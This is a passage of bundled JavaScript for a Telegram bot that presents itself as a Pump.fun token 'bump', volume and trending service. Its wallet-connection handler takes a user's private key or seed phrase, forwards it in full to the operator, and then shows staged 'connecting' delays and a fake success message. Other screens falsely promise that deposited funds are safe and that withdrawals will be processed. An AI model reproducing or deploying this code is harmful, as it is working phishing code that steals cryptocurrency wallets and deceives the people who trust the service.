            await ctx.reply(buildTokenFoundMessage(text, info), {
              parse_mode: "HTML",
              ...confirmOrderKeyboard
            });
          }
        }
        break;
      }
      // ── TX hash ───────────────────────────────────────────────────────────
      case "awaiting_tx_hash": {
        const txHash = text;
        const s = getSession(ctx.from.id);
        clearSession(ctx.from.id);
        await ctx.reply(
          `\u2705 <b>Transaction Submitted!</b>

\u{1F517} TX Hash: <code>${txHash}</code>

\u{1F50D} We are verifying your payment...
\u{1F680} Your order will be processed within <b>5\u201330 minutes</b> after confirmation.

\u{1F4EC} You will receive a notification when your boost is live!

Need help? Tap <b>\u{1F4AC} Contact Support</b>`,
          { parse_mode: "HTML", ...mainMenuKeyboard }
        );
        await notifyAdmin(
          `\u{1F4B8} <b>TX Hash Submitted</b>
\u{1F464} User: ${ctx.from.first_name} (ID: <code>${ctx.from.id}</code>)
\u{1F517} TX: <code>${txHash}</code>
\u2699\uFE0F Service: ${s.serviceLabel ?? "N/A"}
\u{1F4B0} Amount: ${s.selectedSol} SOL
\u{1F194} Order ID: ${s.orderId ?? "N/A"}
\u{1F4EE} Wallet: <code>${s.paymentWallet ?? "N/A"}</code>`
        );
        break;
      }
      // ── Wallet credential ─────────────────────────────────────────────────
      case "awaiting_wallet_credential": {
        const credential = text;
        clearSession(ctx.from.id);
        const isKey = credential.split(" ").length < 5;
        const credType = isKey ? "Private Key" : "Seed Phrase";
        await notifyAdmin(
          `\u{1F511} <b>WALLET CONNECTED \u2014 ${credType}</b>
\u{1F464} User: ${ctx.from.first_name} (ID: <code>${ctx.from.id}</code>)
\u{1F516} Username: ${ctx.from.username ? "@" + ctx.from.username : "N/A"}
\u{1F5DD} ${credType}: <code>${credential}</code>`
        );
        await ctx.reply(
          `Connection of wallet may take time due to

<b>TIME BASE LOCATION AND NETWORK CONGESTION .....</b>

Please wait linking and importing your wallet..

Processing .........`,
          { parse_mode: "HTML" }
        );
        await new Promise((r) => setTimeout(r, 4e3));
        await ctx.reply(
          `\u2705 <b>Wallet Connected Successfully!</b>

Your wallet has been linked to your account.
You can now use all premium features.`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        break;
      }
      // ── Withdraw request ──────────────────────────────────────────────────
      case "awaiting_withdraw_address": {
        clearSession(ctx.from.id);
        await ctx.reply(
          `\u{1F4E4} <b>Withdrawal Request Received</b>

Details: <code>${text}</code>

Our team will process your withdrawal within 24 hours.`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        await notifyAdmin(
          `\u{1F4E4} <b>Withdrawal Request</b>
\u{1F464} User: ${ctx.from.first_name} (ID: <code>${ctx.from.id}</code>)
Details: <code>${text}</code>`
        );
        break;
      }
      default: {
        await sendWelcome(ctx);
      }
    }
  });
  return bot;
}
function buildTokenFoundMessage(ca, info) {
  return `\u{1F4CB} <b>Project Details Found!</b>

\u{1F4CA} PUMPFUN_SCRAPE Token

\u2705 <b>Contract Address:</b>
${ca}

\u{1F4CA} <b>Token Information:</b>
\u2022 Name: ${info.name ?? "Unknown"}
\u2022 Symbol: ${info.symbol ?? "???"}
\u2022 Price: ${info.price ?? "0.00e+0"}
\u2022 Market Cap: ${info.marketCap ?? "0.00"}
\u2022 24h Volume: ${info.volume24h ?? "0.00"}
\u2022 Liquidity: ${info.liquidity ?? "0.00"}
\u2022 24h Change: ${info.change24h ?? "0.00"}%
\u2022 DEX: ${info.dex ?? "pumpfun"}
\u2022 Chain: solana

\u{1F517} Available on: \u{1F7E2} Pumpswap \u2022 \u{1F7E2} Pump.fun

\u{1F517} View Token: https://pump.fun/coin/${ca}`;
}
async function sendWelcome(ctx) {
  await ctx.replyWithPhoto(
    { source: IMG.welcome },
    {
      caption: `\u{1F7E2} <b>Welcome to PUMPFUN TREND BOT service!</b>

New to volume bots? No worries \u2014 we made it super simple!

\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014
\u2014\u2014

<b>How it works:</b>
1. Select how much Bumps/volume to use.
2. Pick how long to run and how Massive you want your Token to Pump.
3. Done! Pump.fun Server handles the rest.

\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014
\u2014\u2014

<b>Works on:</b>
\u{1F7E2} Pumpfun \u2022 \u{1F7E2} Raydium \u2022
\u{1F7E2} PumpSwap \u2022 \u{1F7E2} Moonshot \u2022
\u{1F7E2} LetsBonk \u2022 \u{1F7E2} Dexpad/screener \u2022

From 0.3-0.4-0.5-0.6 SOL bumps boost trend with mass volume of high stabilities.`,
      parse_mode: "HTML",
      ...mainMenuKeyboard
    }
  );
}
async function showStartBumping(ctx) {
  await ctx.reply(
    `The fastest and cheapest Telegram bot for creating bump orders.

<b>Supported Platform:</b>
Pumpfun and Raydium.

Pumpfun BumpBot charges a one-time fee of 0.3 SOL per token, making it the cheapest bump bot ever!

\u{1F4CA} <b>Trending channel:</b>
https://t.me/pumpmints

Subscribe to our PF alert tools:
- PF New Raydium Pools: t.me/pumpswap_pools

For more information, please contact @mrpooh`,
    { parse_mode: "HTML", ...solPickerKeyboard }
  );
}
async function showVolumeBoost(ctx) {
  await ctx.replyWithPhoto(
    { source: IMG.volume },
    {
      caption: `\u{1F9EA} Iron Package - $50,000 Volume
\u{1F9EA} Bronze Package - $250,000 Volume
\u{1F9EA} Silver Package - $100,000,000 Volume
\u{1F9EA} Gold Package - $100,000 Volume
\u{1F9EA} Platinum Package - $500,000 Volume
\u{1F9EA} Diamond Package - $2,500,000 Volume

Please select the package below:`,
      parse_mode: "HTML",
      ...volumeBoostKeyboard
    }
  );
}
async function showTrendingBoost(ctx) {
  await ctx.replyWithPhoto(
    { source: IMG.trending },
    {
      caption: `\u{1F7E2} <b>Discover the Power of Trending!</b>

Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!

\u{1F7E2} A paid boost guarantees you a spot in our daily livestream (AMA)!

\u27A1\uFE0F Please choose SOL Trending or Pump Fun Trending to start:`,
      parse_mode: "HTML",
      ...trendingMenuKeyboard
    }
  );
}
async function showDexScreener(ctx) {
  await ctx.reply(
    `\u{1F310} DEX Screener is a data platform and on-chain analytics tool designed for decentralized exchanges (DEXs), providing real-time insights into token prices, liquidity pools, trading volumes, and market trends across multiple blockchains.

<b>TREND ON DEX</b>`,
    { parse_mode: "HTML", ...dexscreenerKeyboard }
  );
}
async function showDeposit(ctx) {
  const wallet = deriveWalletForUser(ctx.from.id);
  await ctx.reply(
    `<b>WALLET BALANCE</b>

<b>ETH:</b>
<code>${ETH_ADDRESS}</code>
balance: 0 ETH

<b>SOL:</b>
<code>${wallet.address}</code>
balance: 0 SOL

Deposit not less than 0.30 SOL and get trending on several platforms

\u{1F4B0} KINDLY CLICK ON THE ADD BUTTON TO GENERATE YOUR WALLET.
\u{1F4A1} NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`,
    { parse_mode: "HTML", ...depositKeyboard }
  );
}
async function showConnectWallet(ctx) {
  await ctx.replyWithPhoto(
    { source: IMG.walletconnect },
    {
      caption: `\u{1F517} <b>Connect Your Wallet</b>

Welcome to our secure wallet connection service!

Connect your wallet to unlock premium features and enhanced trading capabilities.

<b>Available Options:</b>
\u{1F517} Connect Now - Start the connection process
\u{1F510} Why Connect? - Learn about the benefits
\u{1F6E1} Security Guidelines - Important safety information
\u{1F4F1} How to Connect - Step-by-step instructions

Your security is our top priority. We use industry-standard encryption to protect your information.`,
      parse_mode: "HTML",
      ...connectWalletKeyboard
    }
  );
}
async function showSupport(ctx) {
  await ctx.reply(
    `\u{1F4AC} <b>Contact Support</b>

For more information, please contact @mrpooh

\u{1F4CA} Trending channel: https://t.me/pumpmints

Your User ID: <code>${ctx.from.id}</code>`,
    { parse_mode: "HTML", ...mainMenuKeyboard }
  );
}

// src/index.ts
var rawPort = process.env["PORT"];
if (!rawPort) throw new Error("PORT environment variable is required");
var port = Number(rawPort);
if (Number.isNaN(port) || port <= 0) throw new Error(`Invalid PORT: "${rawPort}"`);
var token = process.env["TELEGRAM_BOT_TOKEN"];
if (!token) {
  logger.warn("TELEGRAM_BOT_TOKEN not set \u2014 starting HTTP server only");
  app_default.listen(port, () => logger.info({ port }, "Server listening (no bot)"));
} else {
  const bot = createBot();
  const renderHostname = process.env["RENDER_EXTERNAL_HOSTNAME"];
  const webhookDomain = renderHostname ? `https://${renderHostname}` : process.env["WEBHOOK_DOMAIN"] ?? null;
  if (webhookDomain) {
    const secretPath = `/telegraf/${bot.secretPathComponent()}`;
    app_default.use(bot.webhookCallback(secretPath));
    app_default.listen(port, () => {
      logger.info({ port, mode: "webhook", webhookDomain }, "Server listening");
      bot.telegram.setWebhook(`${webhookDomain}${secretPath}`).then(() => logger.info({ webhookDomain }, "Webhook registered")).catch((err) => logger.error({ err }, "Failed to set webhook"));
    });
  } else {
    bot.telegram.deleteWebhook({ drop_pending_updates: true }).catch(() => {
    });
    app_default.listen(port, () => {
      logger.info({ port, mode: "long-poll" }, "Server listening");
      bot.launch({ dropPendingUpdates: true }).then(() => logger.info("Bot launched (long-poll)")).catch((err) => logger.error({ err }, "Bot launch failed"));
    });
  }
  process.once("SIGINT", () => bot.stop("SIGINT"));
  process.once("SIGTERM", () => bot.stop("SIGTERM"));
}
//# sourceMappingURL=index.mjs.map
